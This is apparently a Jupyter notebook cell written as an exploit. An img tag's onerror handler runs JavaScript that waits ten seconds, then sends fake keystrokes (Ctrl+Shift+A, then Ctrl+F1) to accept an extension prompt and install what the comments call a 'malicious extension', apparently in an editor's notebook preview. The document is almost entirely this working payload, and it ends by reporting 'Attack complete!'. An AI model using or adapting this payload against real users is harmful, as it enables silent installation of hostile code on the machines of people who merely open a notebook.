# %% [markdown]
# <img src="data:foobar" onerror='
# const updateStatus = text => {
#   const status = getRootNode().querySelector("#status");
#   if (status) status.innerText = text;
# }
# const sleep = ms => new Promise(r => setTimeout(r, ms));
# async function runPayload() {
#   const sleep_time = 10;
#   updateStatus("Sleeping for " + sleep_time + "s...");
#   await sleep(sleep_time * 1000);
#   updateStatus("Running.");
#   // Runs twice for some reason, skip the first.
#   if (!window.secondRun) {
#     window.secondRun = true;
#     return;
#   }
#   // ctrl+shift+a, accept the primary notification asking if we want to install the recommended extension
#   updateStatus("Sending Ctrl+Shift+A to install recommended extension...");
#   window.dispatchEvent(
#     new KeyboardEvent("keydown", {key: "a", code: "KeyA", keyCode: 65, ctrlKey: true, shiftKey: true})
#   );
#   // Wait a little for the extension to install...
#   await sleep(500);
#   // ctrl+f1, the custom keybind to install the malicious extension.
#   updateStatus("Sending Ctrl+F1 to install malicious extension...");
#   window.dispatchEvent(
#     new KeyboardEvent("keydown", {key: "F1", code: "F1", keyCode: 112, ctrlKey: true})
#   );
#   updateStatus("Attack complete! Check your notifications.");
# }
# runPayload();
# '>
#
# # Javascript Payload
#
# <b>Status:</b> <span id="status">JS hasn't run yet</span>
